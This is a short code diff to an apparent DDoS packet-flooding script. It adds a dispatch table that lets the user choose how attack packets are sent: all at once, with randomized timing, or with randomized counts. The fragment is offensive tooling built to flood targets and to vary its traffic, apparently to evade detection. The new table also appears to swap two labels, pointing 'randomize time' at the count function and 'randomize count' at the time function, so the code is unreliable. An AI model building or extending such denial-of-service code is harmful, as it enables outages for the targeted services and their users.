@@ -51,8 +51,13 @@ def send_randomize_send_time_and_count(
          packet_number -= random_send_count
          send(packet, count=random_send_count)
 
+send_type_dict = {
+   "all at once" : send_all_at_once,
+   "randomize time" : send_randomize_send_count,
+   "randomize count" : send_randomize_send_time,
+   "randomize time and count" : send_randomize_send_time_and_count
+   }
+
 def send_ddos_attack_object(modified_ddos_attack_object, script_args):
-   #send_randomize_send_count(modified_ddos_attack_object, script_args)
-   #send_randomize_send_time(modified_ddos_attack_object, script_args)
-   send_all_at_once(modified_ddos_attack_object, script_args)
-   #send_randomize_send_time_and_count(modified_ddos_attack_object, script_args)
+   send_function = send_type_dict[script_args["send type"]]
+   send_function(modified_ddos_attack_object, script_args)
